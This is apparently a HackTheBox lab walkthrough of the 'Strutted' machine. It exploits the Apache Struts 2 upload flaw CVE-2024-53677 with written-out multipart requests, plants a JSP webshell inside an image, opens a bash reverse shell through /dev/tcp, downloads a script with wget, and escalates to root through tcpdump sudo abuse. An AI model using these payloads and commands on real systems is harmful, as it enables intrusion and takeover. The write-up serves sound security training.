==================================

![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*wL6dxtCA5Xyy-d0MLa4hcA.png)

[Reference](https://medium.com/bugbountywriteup/strutted-walkthrough-hackthebox-481d056eb559) by [MrXcrypt](https://medium.com/@misterxcrypt?source=post_page---byline--7f0ef247f851--------------------------------)

Introduction
============

In this write-up, We’ll go through a medium Linux machine where we first gain an initial foothold by exploiting the Apache Struts 2 CVE, followed by leveraging a misconfigured sudo permission for tcpdump to gain root access.

Reconnaissance
==============

1.  After Starting the machine, I set my target IP as $target environment variable and ran the Nmap command.

**_Command — Port Scan: Nmap_**

```

nmap $target --top-ports=1000 -sV -v -sC -Pn > nmap.out

```

![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*GEbKoindNso1WeHlQd2-3w.png)

1. As usual, I added the host: strutted.htb in /etc/hosts.

2. I started directory and subdomain fuzzing in the background while enumerating the website.

3. A Download option was available to obtain the platform’s Docker source, allowing us to explore its configuration in detail.  

![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*8mNFAbxoF20A4DDKLqVrSg.png)

  

4. After Downloading the zip file, and unzipping it. There were credentials in the file ‘tomcat-users.xml’. But unable to use it anywhere.

  

5. Upon searching other files in the package, I noticed a file ‘pom.xml’.

  

![captionless image](https://miro.medium.com/v2/resize:fit:1314/format:webp/1*9qCOBbeu4MhXfJSQai9Rdg.png)

  

6. It contains all the dependencies of the application. This application uses Apache Struts 2 version 6.3.0.1.

  

7. Searching for vulnerabilities in the Apache Struts 2 gave me this link.

  

![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*AZIP3qzAutnKYLs4e_m7AQ.png)

  

Explore the article [here.](https://security.snyk.io/package/maven/org.apache.struts%3Astruts2-core/6.3.0.1)

  

8. There are two CVEs, both affecting the file upload mechanism in Apache Struts 2 to get RCE. Among those, CVE-2024–53677 is the recently discovered vulnerability.

  

9. While searching exploit for this CVE, I found an interesting article which explains clearly in and out of this vulnerability.

  

[Must Read Article.](https://attackerkb.com/topics/YfjepZ70DS/cve-2024-53677)

  

# Initial Foothold

================

  

## CVE-2024–53677 Description

--------------------------

  

> [CVE-2024–53677](https://nvd.nist.gov/vuln/detail/CVE-2024-53677) is a flawed upload logic vulnerability in Apache Struts 2. The vulnerability permits an attacker to override internal file upload variables in applications that use the Apache Struts 2 [File Upload Interceptor](https://struts.apache.org/core-developers/file-upload-interceptor). Malicious uploaded files with relative path traversal sequences in the name result in arbitrary file write, facilitating remote code execution in many scenarios.

  

10. It’s pretty fine if you can’t understand this now, I’ll clearly explain in three steps.

  

### Proof of Concept:

-----------------

  

**Step 1:**

  

The file uploading request looks like below.

  

```

------WebKitFormBoundaryiqze7OZ2lynLStkK

Content-Disposition: form-data; name="upload"; filename="../testwrite.txt"

Content-Type: text/plain

TESTING

------WebKitFormBoundaryiqze7OZ2lynLStkK

```

  

First, We are trying to upload a text file with a simple path traversal payload. But This will get stripped and will fail.

  

```

RESULT: /path1/uploads/testwrite.txt

```

  

**Step 2:**

  

Now, We will try to use _top.uploadFileName_, the internal OGNL value used by Struts 2 for single-file uploads,

  

```

------WebKitFormBoundaryiqze7OZ2lynLStkK

Content-Disposition: form-data; name="upload"; filename="testwrite2.txt"

Content-Type: text/plain

TESTING

------WebKitFormBoundaryiqze7OZ2lynLStkK

Content-Disposition: form-data; name="top.uploadFileName"

../testwrite2.txt

------WebKitFormBoundaryiqze7OZ2lynLStkK--

```

  

Here we are trying to inject a path traversal attempted filename in the actual file name by using _top.uploadFileName._

  

So Basically, the value ‘../testwrite2.txt’ should also get uploaded in the specified path ‘../’. But this attempt will also fail.

  

```

RESULT: /path1/uploads/testwrite2.txt

```

  

**Step 3:**

  

In this Last step, We will try to confuse the upload data handling logic, by using capitalized ‘U’ in upload.

  

```

------WebKitFormBoundaryiqze7OZ2lynLStkK

Content-Disposition: form-data; name="Upload"; filename="testwrite3.txt"

Content-Type: text/plain

TESTING

------WebKitFormBoundaryiqze7OZ2lynLStkK

Content-Disposition: form-data; name="top.UploadFileName"

../testwrite3.txt

------WebKitFormBoundaryiqze7OZ2lynLStkK--

```

  

By using ‘Upload’ instead of ‘upload’ in the name parameter, we can successfully upload the file in the specified path.

  

This path traversal file upload will be successful.

  

```

RESULT: /path1/testwrite3.txt

```

  

## Exploit:

--------

  

11. The application enforces file uploads to be image files only. It uses a function that checks the magic bytes to ensure the uploaded file is indeed an image.

  

![/strutted/src/main/java/org/strutted/htb/Upload.java](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*GU54jd2lBO8NcWK11EYA6w.png)

  

12. The attack path involves embedding a malicious JSP file into the header of an image. Then, by abusing OGNL parameters, we change the file’s name to a JSP file, allowing us to trigger our payloads.

  

13. Here you can get the [webshell JSP file](https://github.com/TAM-K592/CVE-2024-53677-S2-067/blob/ALOK/shell.jsp) which we can use as payload.

  

14. In burpsuite, Intercept the request after uploading an image.

  

![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*OwVMLZcfWI-HMaCdlU_vnA.png)

  

15. Add the payload right after the first line of the image header and add OGNL parameter abuse just like in **Step 3**.

  

![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*_wg7fB_y7uVfSVviKmSvRQ.png)![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*uOONG09E_x2lRYZGX_Is6Q.png)

  

16. Now we can execute commands using this URL: [http://strutted.htb/shell.jsp?action=cmd&cmd=](http://strutted.htb/shell.jsp?action=cmd&cmd=id){command}.

  

![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*vKz1W0Qdy4kztl4ePDllVg.png)

  

## Reverse shell:

--------------

  

17. Now let’s take reverse shell by sending a rev shell script.

  

**_Command — Reverse shell: bash_**

  

```

bash -c "bash -i >& /dev/tcp/10.10.14.73/4444 0>&1"

```

![captionless image](https://miro.medium.com/v2/resize:fit:1094/format:webp/1*nXcf2dIc2MUBC-qYS7ba2Q.png)

  

18. Start a Python server to host the file and use wget to download it.

  

**_Command — Python Server: python_**

  

```

python3 -m http.server 8000

```

![captionless image](https://miro.medium.com/v2/resize:fit:1274/format:webp/1*5L40gdPvzW-DMd04vodFPg.png)

  

19. Let’s run the wget command in the Request.

  

**_Command — Download a file: wget_**

  

```

wget http://10.10.14.73:8000/bash.sh -O /tmp/bash.sh

```

![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*5CtQcsFRYrw0LJM50QtZ6g.png)

  

20. The above command will download our bash.sh to the web server in the /tmp directory.

  

![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ZJs8y8yz1OvnrUpE0NVO6Q.png)

  

21. Let’s make the file executable using chmod.

  

**_Command — Executable file: chmod_**

  

```

chmod 777 /tmp/bash.sh

```

![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*rafbQGD337PuKvfw3KHqVg.png)

  

22. Now Start the netcat listener on port 4444 and run the /tmp/bash.sh file.

  

![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*QjXdP5L1aiDrRWtJJ8rBeQ.png)![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*zvp49AsfPXa04Qey9YQeMA.png)

  

# Lateral Movement

================

  

## i. User Flag

------------

  

23. In conf directory, I found the same tomcat-users.xml file. But It had different credentials.

  

![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*8fNc_ww-8hVcj45HotTcUA.png)

  

24. Now we need to find the users on this machine to try this password.

  

**_Command — Find Users: /etc/passwd_**

  

```

cat /etc/passwd

```

![captionless image](https://miro.medium.com/v2/resize:fit:1330/format:webp/1*AMHU6esG0TTmoQyHZNJZGQ.png)

  

25. Let’s Try this password for the user ‘james’.

  

![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*GPhLHOwFaKYsa7laEgrLfQ.png)

  

## ii. Root Flag

-------------

  

26. After getting the user-level access, I checked for running processes, and open ports as usual, but nothing seemed to interest me.

27. Let’s check for the sudo permissions commands of the user james.

  

**_Command — sudo permission commands: sudo_**

  

```

sudo -l

```

![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*l_Vj04nsQp4xgp4qOiOcSA.png)

  

28. It’s time to visit my favorite [gtfo bin](https://gtfobins.github.io).

  

29. Searching for ‘tcpdump’ in gtfo bin gave us this.

  

![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*c5_BgoGvbK7Ty53cwpypXw.png)

  

30. Let’s craft our own malicious command though this method.

  

31. First, copy /bin/bash to the /tmp folder and set the SUID bit to grant root privileges when executed.

  

```

COMMAND='cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash'

TF=$(mktemp)

echo "$COMMAND" > $TF

chmod +x $TF

sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root

```

![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*zUERFJYeGq7pGwQd-wNE2g.png)

  

32. Now We will have our bash file in the tmp directory. Just run it with the ‘-p’ flag to get root.

  

> In the context of privilege escalation, when you execute `/bin/bash -p`, it ensures that the environment is maintained as is, allowing you to retain the necessary permissions and variables that might be important for executing further commands as root. Without the `-p` flag, some important environment variables might be reset, potentially interfering with the exploitation process.

  

![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*AeOv6X1pL-RuZSBk_8wQWA.png)

  

Now, We are ROOT! Thanks for Reading. Happy hacking!!